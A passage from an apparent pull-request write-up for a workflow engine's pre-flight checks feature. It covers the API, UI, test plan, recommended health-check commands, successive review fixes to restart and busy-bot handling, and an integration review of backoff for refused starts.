so only the workflow's owner should edit them; the panel says so in visible
text.

**4. API** (`server/workflow-api.ts`). `preflight` in the create/patch
schema (shapes only — a discriminated union per kind with size bounds; the
semantics stay the validator's, so a half-edited panel saves and paints),
key-set drift guards for the object and each variant, `preflight` added to
`CLEARABLE_FIELDS` (`null` clears it). New `POST /api/workflows/:id/preflight`
→ `engine.testPreflight(id)` → `{ preflight: WorkflowPreflightResult }`,
200; 404 unknown; no run, nothing persisted. **The endpoint takes no body**
— it runs the saved checks only. An endpoint that ran whatever it was
posted would be a remote shell for anyone who can reach the socket.

**5. UI.** `WorkflowPreflightPanel` (popover beside Schedule): add/remove
checks of each kind, per-kind fields, live `bad-preflight` messages from
the shared validator, timeout, "Test pre-flight" (flushes the debounced
save first, then POSTs; a failed save refuses the test rather than testing
yesterday's list), verdict list green/red with detail, duration and the
masked output. The last verdict per workflow lives in the store
(`workflowPreflightTests`, action `workflowPreflightTested`, dropped on
`workflowDeleted`); `workflowPatchBody` now sends `preflight` (null clears).
The run timeline shows "Pre-flight checks running before `<node>`" while
parked and, once landed, a "Pre-flight · passed/failed" list with each
check's verdict and — for failed ones — its output.

### How to test

```
pnpm typecheck
pnpm lint
node_modules/.bin/vitest run shared/workflow.test.ts server/workflow-preflight.test.ts \
  server/workflow-run.test.ts server/workflow-api.test.ts server/workflow-store.test.ts \
  server/auto-approve.test.ts src/state src/lib/workflow-graph.test.ts \
  src/components/WorkflowPreflightPanel.test.ts src/components/WorkflowRunTimeline.test.ts
node_modules/.bin/vitest run server/index.test.ts
```

`server/workflow-preflight.test.ts` spawns real `node -e` children: exit
codes, cwd, inherited env, stdout regex, the deadline kill (the two timeout
tests take the minimum legal 5 s each), secret masking, parallelism,
bots/engine fakes, throwing hooks. `server/workflow-run.test.ts` ("pre-flight"
describe) injects a fake runner: pass → dispatch; fail → failed at the
entry with the check named, output masked, notification, no task; `^$`
dirty tree; busy bot; engine verdict; not stranded / not timed out while in
flight; **restart mid-check re-runs the checks** (start and resume);
cancel drops the late verdict; resume re-checks and refuses again;
resume at a later node checks before THAT node; queued run checked at
promotion; daily slot refused → failed receipt + notification + next slot
fires; interval refused → one-interval backoff; webhook run same path;
command never carries the input; `testPreflight` persists nothing;
invalid shape still refused synchronously; pre-existing receipt re-driven
as before. API tests cover schema/clear/400, the 201-then-failed frame,
and the test endpoint ignoring a body.

Manual: open a workflow → **Pre-flight** → add `Command` `gh auth status`,
`Bots ready`, `Engine health` → **Test pre-flight**. Then `gh auth logout`
and press **Run**: the run appears, then goes red within a second with
`pre-flight check "…" failed: exited with code 1 (expected 0)` and the
stderr line on the timeline; no task thread was created on the bot.

### Recommended pre-flight for "Entrega contínua · nuria-platform"

| Check | Kind | Setting |
|---|---|---|
| `gh auth` | command | `gh auth status` |
| `gh scopes` | command | `gh api user -i -H "Accept: application/vnd.github+json" \| grep -i x-oauth-scopes`, stdout must match `project` (or `repo\|project`) |
| `clean tree` | command | `git -C /path/to/nuria-platform status --porcelain`, stdout must match `^$` |
| `provider up` | command | `curl -sf https://api.openai.com/v1/models -o /dev/null -H "Authorization: Bearer $OPENAI_API_KEY"` (or the provider the bots use) |
| `bots` | bots-ready | all in the workflow, wait up to 10 min (a shared bot mid-turn at 09:00 is waited out, not a failure) |
| `codex` | engine-health | the `gpt-6-astra` bot |

`gh auth status` exits 0 whenever a token exists, whatever its scopes; the
`x-oauth-scopes` header is what says `read:project` vs `project`. It is a
classic-token header — a fine-grained PAT has none; probe the access
itself then (`gh project view N --owner ORG`).

### Review fixes (second pass)

1. **Blocker — a stale `preflightStartedAt` could re-run a finished node.**
   `launch`'s no-checks branch (checks removed by a PATCH between the
   process dying mid-pre-flight and the restart) went to `dispatchNode`
   with the marker still on the receipt; the timeline then read "checks
   running" for the whole run, and on a second restart in the "result
   recorded, edge not followed" window the marker branch of
   `recoverStranded` took precedence over `follow` and re-dispatched the
   node whose result was already on the receipt — a merge or a deploy
   twice. Fixed twice over: `dispatchNode` now clears the marker at its
   top (a dispatch is the end of whatever pre-flight guarded the node,
   whichever kind of node and whichever write follows), and
   `recoverStranded` judges "current node already has its result → follow"
   BEFORE the marker, dropping the marker on the way — so a marker left on
   a receipt by any build or hand edit can never turn a recorded result
   into a second execution. Tests: "checks removed between death and
   restart" (dispatched, marker gone, nothing re-done on later ticks);
   "stale marker on a receipt whose current node already finished" (the
   restart dispatches `shipper`, never `planner` again); "the marker never
   outlives a dispatch" (wait node entry).
2. **`bots-ready` waits a busy bot out instead of refusing.** A check whose
   only problems are BUSY bots comes back `transient: true`; the engine
   keeps the marker and the verdict on the run and parks it with
   `nextAttemptAt = now + 30 s` (the busy re-park interval). `dispatchDue`
   sends a due run carrying the marker back through `launch` — the checks
   run again, the verdict is refreshed — until the wait is spent, measured
   from the FIRST `preflightStartedAt` (which `launch` now preserves across
   re-checks, so a restart mid-wait neither resets nor loses the budget).
   The wait is the check's `waitMinutes` (0..120, default 10; the max over
   the transient-failed checks); past it the run fails with
   `pre-flight check "bots" failed: bot "x" is busy — still busy after N
   min`. A MISSING bot, or any non-transient failure beside a busy one,
   refuses the run at once, as before. Timeline: "Pre-flight waiting for a
   busy bot before `<node>` — next check HH:MM", verdict header "· waiting"
   (warning tone) rather than "· failed" while the run still lives. Panel:
   "Wait up to N min" on the bots-ready row. Tests: parks/re-checks/
   dispatches when freed with no notification; budget from first start
   across a restart, then refused naming the wait; `waitMinutes: 0`;
   missing bot terminal; busy beside a real failure refuses now; cancel
   while parked.
3. **Partial output survives the deadline.** The runner is told to abort
   first and gets a 5 s grace before the check is judged on nothing; the
   default runner kills the child and resolves with `timedOut: true` AND
   the buffers it had. `echo diagnostic-line; sleep 303` under a 5 s
   timeout now reads `timed out after 5s` with `diagnostic-line` in
   `stdout` (masked and bounded as always). Worst case a check overruns
   the deadline by the grace (7 s after the third pass).
4. **Minor.** `killCliTree` returning `false` (the shell ignored TERM —
   `trap '' TERM; sleep 777`, and the exec'd child inherits the ignore)
   escalates to `SIGKILL` on the process group (probed: killed at 5.2 s,
   partial stdout kept, no `sleep` left behind). `expectStdoutMatch` is
   tested against the first 16 KB of stdout (`PREFLIGHT_MATCH_MAX`). Check
   names are compared trimmed by the validator. The panel keys check rows
   by a client-side id list, not the index. Docs: checks must be
   read-only and idempotent (they run at every start, resume and
   re-check), and the scrubber's limits are spelled out — a credential
   inside a URL, a password with punctuation after `PASSWORD=`, or a
   secret with no recognisable shape is NOT masked; do not print them.

### Review fixes (third pass)

1. **Blocker — a legitimate pre-flight re-armed by `resumeRun` was
   skipped.** Scenario: `plan → ship`, edge deleted in flight, `plan`
   finishes `done`, `follow` refuses "workflow changed" → `failed` with
   plan's result recorded and `currentNodeId = plan`; the owner restores
   the edge and resumes → `launch` writes the marker and starts the checks;
   the process dies before the verdict; on restart the second-pass
   "follow before marker" order dispatched `ship` with NO verdict on the
   receipt. Rule now enforced: **nothing is dispatched while
   `preflightStartedAt` is set and `preflight` is absent.**
   `recoverStranded` judges the marker FIRST again (re-runs the checks);
   the "finished node is never re-run" guarantee moved to
   `settlePreflight`, which on a pass `follow`s the recorded result when
   the guarded node already has one, and `dispatchNode`s otherwise. Tests:
   the scenario above with a mute runner in the restarted engine
   (`dispatches` empty, marker present, no verdict, across two ticks) and
   with an answering one (`preflight.ok` recorded first, then `shipper`
   dispatched, plan's result kept, plan never re-run); the stale-marker
   receipt test now expects re-check → follow.
2. **Only transient checks are re-asked during a busy wait.** `launch`
   with `recheck` runs the subset whose previous result was
   `transient`-failed and merges the fresh answers into the previous
   verdict (`at` = now; earlier `gh auth status` / driver probe answers
   carried); a subset that no longer exists (checks edited during the
   wait) runs the whole list. Tested: the command runner is not called
   during the re-checks; the merged verdict keeps both entries.
3. `waitMinutes: 0` refuses with `— no wait configured for a busy bot`
   rather than a fictitious "after 1 min". `DEADLINE_GRACE_MS` is 7 s —
   longer than `killCliTree`'s 5 s TERM wait, so the SIGKILL escalation
   and the partial buffers land inside the grace instead of racing it.
4. **Note for item E (watchdog).** A run with `preflightStartedAt !==
   undefined` is not stuck: it has no thread and no `dispatchedAt` by
   design, and either an in-process flight (no timer) or a `nextAttemptAt`
   (busy wait) behind it. The watchdog must exclude it — the same way
   `isStranded` and `sweepTimeouts` do — or it would kill every run in
   pre-flight as "dispatched nothing for N minutes". **Done at integration**
   (`fix(workflow): reconcile E/H`): `stuckThresholdMs` returns null for
   such a run, `GET /api/workflows/health` lists it under `runs.preflight`
   (`since`, `inPreflightForMs`, `waitingForBot`) rather than `runs.stuck`,
   and a passed verdict re-stamps `nodeEnteredAt` at the dispatch so the
   minutes spent waiting on a busy bot in pre-flight are not counted
   against the node's stay.

### Left out, on purpose

- **Write access cannot be probed without writing.** `x-oauth-scopes`
  proves the token's scope, not that the project accepts a mutation from
  it; a `gh api graphql` mutation as a check would be a side effect. The
  scope check is the honest cheap proxy.
- **No per-check timeout.** One deadline for the set; a slow check is a
  reason to raise it, not to budget checks separately.
- **The verdict is not re-run mid-run.** A run that passed at 09:00 and
  loses its token at 10:00 fails at the node that needs it, as before; the
  pre-flight is about the START.
- **The busy wait is per pre-flight, not global.** Two workflows sharing a
  bot both wait on it independently; whichever re-check finds it free
  first dispatches, and the other keeps waiting (its wait, not a queue).
- **Interval backoff after a refusal** was one plain interval when this item
  shipped; the integration review replaced it with the refusal streak
  (doubling re-arm, capped at 6 h, quiet after the first refusal — see
  "Integration review"). A refused pre-flight feeds the same streak.
- **The command runs through a shell** (so pipes and `$VAR` work), which
  means the author's string is a shell script. That is the feature and the
  risk, hence the ownership note; no allowlist of programs was added.
- **`engine-health` is the driver's own snapshot.** For a driver whose
  snapshot is static (openai-chat: "an API key is set"), the check proves
  configuration, not that the provider is up — pair it with a `curl` check.
- No UI for `providerOutage` still; the pre-flight panel does not change
  that.

## Integration review — items A–H together

Final pass over the merged branch (state machine, restart recovery, tick
ordering, notification volume, security surface, compatibility). Fixed in
`fix(workflow): integration — …`, pinned by `server/workflow-integration.test.ts`:

1. `recoverStranded` dispatched a `running` receipt with no `currentNodeId`
   straight to the entry node, past the pre-flight. It now goes through
   `launch` like every other start.
2. `resumeRun` left the failed receipt's `currentThreadId`, `dispatchedAt`
   and `repromptedAt` on a run it re-queued; cleared with the rest.

3. **Refused starts back off and go quiet** (`fix(workflow): integration —
   back off and quiet repeated refused starts`). An interval trigger refused
   every slot (validation, a revoked capability, a missing bot, a failed
   pre-flight, a task that could not be created) left one failed receipt AND
   one notification per interval — 24 a day at 60 min, where the watchdog
   caps itself at 12 per stay and an outage at 2. Now:
   - `Workflow.refusalStreak?: { count, since, lastReason }` — engine-owned
     like `nextRunAt` (`WorkflowStore.setRefusalStreak`, stripped from
     clients by the API's key-set guard, listed by `GET /api/workflows/health`
     per workflow). A refused start is a terminal failure of a run that never
     got a node going (`isRefusedStart`: no result, no thread, attempt 0) or a
     `recordRefusedRun`; each bumps the count. The first dispatch that gets
     past every start gate (bot exists, flags present — busy or not — or a
     gate / notify / wait node dispatched) clears it.
   - The interval trigger re-arms at `idle + min(interval × 2^count, 6 h)`,
     moved into the active window, or at the next window's start when that
     comes first (`refusalFireAt`). A daily schedule keeps its slots and
     only joins and clears the same streak.
   - Receipts are written for every try (cheap, auditable). Of a SCHEDULED
     streak, the person hears the first, the third and every tenth refusal
     (`refusalAnnounced`), the message ending `— N refused starts in a row;
     next try in 6h` (or `at the next scheduled slot` for a daily one). A
     manual or webhook start that is refused is always answered.
   - Pinned in `server/workflow-integration.test.ts`: 24 h of refusals under
     a 60-min interval → 5 tries (1h, 3h, 7h, 13h, 19h) and 2 notifications;
     the first passing run clears the streak and the next arm is one plain
     interval; a restart mid-streak continues count, quiet and backoff from
     disk; a failed pre-flight under a daily schedule counts and clears the
     same way; the health row carries the streak.

Known, deliberately not changed here:

- The watchdog's default patience (120 min) is judged against an agent node
  whose own budget may be longer (`timeoutMinutes × (retries + 1)`); such a
  node is announced while its turn is still legitimately live.
- A daily schedule under a gate held open for days (`renotify`) queues one run
  per slot; they execute back to back once the gate settles. The interval
  trigger never stacks.
- A gate that self-loops and is settled and re-opened in the same millisecond
  reuses its request id, so the refreshed card is the answered one.
